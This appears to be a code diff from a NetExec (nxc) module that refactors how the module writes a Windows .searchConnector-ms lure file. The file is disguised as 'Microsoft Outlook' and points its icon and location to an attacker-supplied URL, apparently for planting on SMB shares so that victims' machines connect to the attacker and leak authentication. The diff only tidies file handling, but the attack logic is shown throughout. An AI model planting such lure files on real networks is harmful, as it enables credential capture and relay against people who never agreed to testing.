@@ -46,22 +46,21 @@ class NXCModule:
         self.file_path = ntpath.join("\\", f"{self.filename}.searchConnector-ms")
         if not self.cleanup:
             self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
-            scfile = open(self.scfile_path, "w")
-            scfile.truncate(0)
-            scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
-            scfile.write("<searchConnectorDescription" ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">') # noqa ISC001
-            scfile.write("<description>Microsoft Outlook</description>")
-            scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
-            scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
-            scfile.write(f"<iconReference>{self.url}/0001.ico</iconReference>")
-            scfile.write("<templateInfo>")
-            scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
-            scfile.write("</templateInfo>")
-            scfile.write("<simpleLocation>")
-            scfile.write(f"<url>{self.url}</url>")
-            scfile.write("</simpleLocation>")
-            scfile.write("</searchConnectorDescription>")
-            scfile.close()
+            with open(self.scfile_path, "w") as scfile:
+                scfile.truncate(0)
+                scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
+                scfile.write("<searchConnectorDescription" ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">') # noqa ISC001
+                scfile.write("<description>Microsoft Outlook</description>")
+                scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
+                scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
+                scfile.write(f"<iconReference>{self.url}/0001.ico</iconReference>")
+                scfile.write("<templateInfo>")
+                scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
+                scfile.write("</templateInfo>")
+                scfile.write("<simpleLocation>")
+                scfile.write(f"<url>{self.url}</url>")
+                scfile.write("</simpleLocation>")
+                scfile.write("</searchConnectorDescription>")
 
     def on_login(self, context, connection):
         shares = connection.shares()
